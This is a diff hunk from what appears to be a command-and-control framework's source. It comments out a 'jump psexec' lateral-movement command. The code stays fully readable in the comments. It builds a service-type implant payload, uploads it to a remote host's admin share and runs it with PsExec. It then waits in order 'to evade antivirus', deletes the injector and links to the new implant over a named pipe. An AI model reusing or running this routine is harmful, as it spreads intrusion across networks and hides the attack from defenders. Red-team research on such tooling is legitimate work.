@@ -59,83 +59,83 @@ namespace Commander.Commands.Agent.LateralMovement
 
         protected override void Run(ScriptingAgent<JumpPsExecCommandOptions> agent, ScriptingCommander<JumpPsExecCommandOptions> commander, ScriptingTeamServer<JumpPsExecCommandOptions> teamServer, JumpPsExecCommandOptions options, CommanderConfig config)
         {
-            if (string.IsNullOrEmpty(options.endpoint))
-            {
-                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
-                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
-            }
+            //if (string.IsNullOrEmpty(options.endpoint))
+            //{
+            //    options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
+            //    commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
+            //}
 
-            var endpoint = ConnexionUrl.FromString(options.endpoint);
-            if (!endpoint.IsValid)
-            {
-                commander.WriteError($"[X] EndPoint is not valid !");
-                return;
-            }
+            //var endpoint = ConnexionUrl.FromString(options.endpoint);
+            //if (!endpoint.IsValid)
+            //{
+            //    commander.WriteError($"[X] EndPoint is not valid !");
+            //    return;
+            //}
 
-            var payloadOptions = new ImplantConfig()
-            {
-                Architecture = agent.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
-                Endpoint = endpoint,
-                IsDebug = false,
-                IsVerbose = options.verbose,
-                ServerKey = config.ServerConfig.Key,
-                Type = ImplantType.Service,
-                InjectionDelay = options.injectDelay,
-                IsInjected = options.inject,
-                InjectionProcess = options.injectProcess
-            };
+            //var payloadOptions = new ImplantConfig()
+            //{
+            //    Architecture = agent.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
+            //    Endpoint = endpoint,
+            //    IsDebug = false,
+            //    IsVerbose = options.verbose,
+            //    ServerKey = config.ServerConfig.Key,
+            //    Type = ImplantType.Service,
+            //    InjectionDelay = options.injectDelay,
+            //    IsInjected = options.inject,
+            //    InjectionProcess = options.injectProcess
+            //};
 
-            if (!string.IsNullOrEmpty(options.injectProcess))
-                payloadOptions.InjectionProcess = options.injectProcess;
+            //if (!string.IsNullOrEmpty(options.injectProcess))
+            //    payloadOptions.InjectionProcess = options.injectProcess;
 
-            commander.WriteInfo($"[>] Generating Payload!");
-            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
-            if (pay == null)
-                commander.WriteError($"[X] Generation Failed!");
-            else
-                commander.WriteSuccess($"[+] Generation succeed!");
+            //commander.WriteInfo($"[>] Generating Payload!");
+            //var pay = commander.GeneratePayload(payloadOptions, options.verbose);
+            //if (pay == null)
+            //    commander.WriteError($"[X] Generation Failed!");
+            //else
+            //    commander.WriteSuccess($"[+] Generation succeed!");
 
-            commander.WriteLine($"Preparing to upload the file...");
+            //commander.WriteLine($"Preparing to upload the file...");
 
-            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
-            if (Path.GetExtension(fileName).ToLower() != ".exe")
-                fileName += ".exe";
+            //var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
+            //if (Path.GetExtension(fileName).ToLower() != ".exe")
+            //    fileName += ".exe";
 
-            string path = (options.target.StartsWith("\\\\") ? string.Empty : "\\\\") + options.target + (options.path.StartsWith('\\') || options.target.StartsWith('\\') ? string.Empty : '\\') + options.path + (options.path.EndsWith('\\') ? string.Empty : '\\') + fileName;
+            //string path = (options.target.StartsWith("\\\\") ? string.Empty : "\\\\") + options.target + (options.path.StartsWith('\\') || options.target.StartsWith('\\') ? string.Empty : '\\') + options.path + (options.path.EndsWith('\\') ? string.Empty : '\\') + fileName;
 
-            agent.Echo($"Downloading file {fileName} to {path}");
-            agent.Upload(pay, path);
-            agent.Delay(1);
-            agent.Echo($"Executing PsExec");
-            agent.PsExec(options.target, path);
+            //agent.Echo($"Downloading file {fileName} to {path}");
+            //agent.Upload(pay, path);
+            //agent.Delay(1);
+            //agent.Echo($"Executing PsExec");
+            //agent.PsExec(options.target, path);
 
-            agent.Delay(2);
-
-
-            if (options.inject)
-            {
-                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
-                agent.Delay(options.injectDelay + 10);
-
-                agent.Echo($"Removing injector {path}");
-                agent.Shell($"del {path}");
-            }
-            else
-            {
-                agent.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
-            }
-
-            if (endpoint.Protocol == ConnexionType.NamedPipe)
-            {
-                var targetEndPoint = ConnexionUrl.FromString($"rpipe://{options.target}:{options.pipe}");
-                agent.Echo($"Linking to {targetEndPoint}");
-                agent.Link(targetEndPoint);
-            }
+            //agent.Delay(2);
 
 
+            //if (options.inject)
+            //{
+            //    agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
+            //    agent.Delay(options.injectDelay + 10);
 
-            agent.Echo($"[*] Execution done!");
-            agent.Echo(Environment.NewLine);
+            //    agent.Echo($"Removing injector {path}");
+            //    agent.Shell($"del {path}");
+            //}
+            //else
+            //{
+            //    agent.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
+            //}
+
+            //if (endpoint.Protocol == ConnexionType.NamedPipe)
+            //{
+            //    var targetEndPoint = ConnexionUrl.FromString($"rpipe://{options.target}:{options.pipe}");
+            //    agent.Echo($"Linking to {targetEndPoint}");
+            //    agent.Link(targetEndPoint);
+            //}
+
+
+
+            //agent.Echo($"[*] Execution done!");
+            //agent.Echo(Environment.NewLine);
         }
 
         //protected override async Task<bool> CreateComposition(CommandContext<GetSystemCommandOptions> context)
